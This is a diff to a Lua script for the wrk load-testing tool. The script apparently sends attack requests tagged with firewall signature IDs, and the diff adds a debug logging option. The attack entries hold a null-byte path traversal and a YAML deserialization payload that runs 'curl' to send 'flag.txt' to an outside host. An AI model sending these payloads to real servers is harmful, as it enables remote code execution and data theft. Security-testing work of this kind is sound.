@@ -1,5 +1,6 @@
 math.randomseed(os.time())
 
+local log_level = none
 local threads = {}
 local threadCount = 0
 local requestCount = {}
@@ -23,7 +24,7 @@ table.insert(methods,{weight = 0, method = 'DELETE'})
 
 local attacks = {}
 attacks[1] = {weight = 1, method = 'GET', path = '/oncomplete=alert/a%00/../test.config', technology_stacks = {'APACHE_TOMCAT','JAVASCRIPT','PYTHON'}, signature_ids = {[200101029]='Detection Evasion'}}
-attacks[2] = {weight = 1, method = 'GET', path = '/', params = {v='!!python/object/apply:os.system [""curl https://crowdshield.com/?`cat flag.txt`""]'}, headers = { first = 'num.toString()' }, technology_stacks = {'APACHE_TOMCAT','JAVASCRIPT','PYTHON'}, signature_ids = {[200004329]='Server Side Code Injection',[200001683] = 'Cross Site Scripting'}}
+attacks[2] = {weight = 1, method = 'GET', path = '/', params = {v='!!python/object/apply:os.system+[""curl+https://crowdshield.com/?`cat+flag.txt`""]'}, headers = { first = 'num.toString()' }, technology_stacks = {'APACHE_TOMCAT','JAVASCRIPT','PYTHON'}, signature_ids = {[200004329]='Server Side Code Injection',[200001683] = 'Cross Site Scripting'}}
 attacks[3] = {weight = 1, method = 'GET', path = '/num.toString()', headers = { first = '"!!python/object/apply:"; nocase;' }, technology_stacks = {'APACHE_TOMCAT','JAVASCRIPT','PYTHON'}, signature_ids = {[200004330]='Server Side Code Injection',[200001684] = 'Cross Site Scripting'}}
 attacks[4] = {weight = 1, method = 'GET', path = '/manager/html/reload', headers = { first = '!!python/object/apply:os.system [""curl https://crowdshield.com/?`cat flag.txt`""]' },technology_stacks = {'APACHE_TOMCAT','JAVASCRIPT','PYTHON'}, signature_ids = {[200004330]='Server Side Code Injection',[200010061] = 'Predictable Resource Location'}}
 
@@ -91,7 +92,7 @@ function init(args)
         if index then
             local left = string.sub(v,0,index-1)
             local right = string.sub(v,index+1)
-
+            if left == 'log_level' then log_level = right end
             if left == 'proxy_addr' then proxy_addr = right end
             if left == 'proxy_port' then proxy_port = right end
         end
@@ -99,7 +100,6 @@ function init(args)
 
     if proxy_addr and proxy_port then
         wrk.orginalAddr = wrk.thread.addr
-        print('magic')
         wrk.thread.addr = wrk.lookup(proxy_addr , proxy_port)[1]
     end
 
@@ -130,9 +130,9 @@ userAgents = non_empty_lines_from("lua_useragents.txt")
 
 function request()
     -- Cleanup WRK Values so that everything is fresh
-    wrk.scheme  = "http"
-    wrk.host    = "localhost"
-    wrk.port    = nil
+    -- wrk.scheme  = "http"
+    -- wrk.host    = "localhost"
+    -- wrk.port    = nil
     wrk.method  = "GET"
     wrk.path    = "/"
     wrk.headers = {}
@@ -194,6 +194,9 @@ function request()
     wrk.path = path
 
     requests = requests + 1
+    if log_level == 'debug' then
+        print(wrk.method .. ' ' .. wrk.scheme .. '://' .. wrk.host .. wrk.path)
 
+    end
     return wrk.format(nil,path)
 end
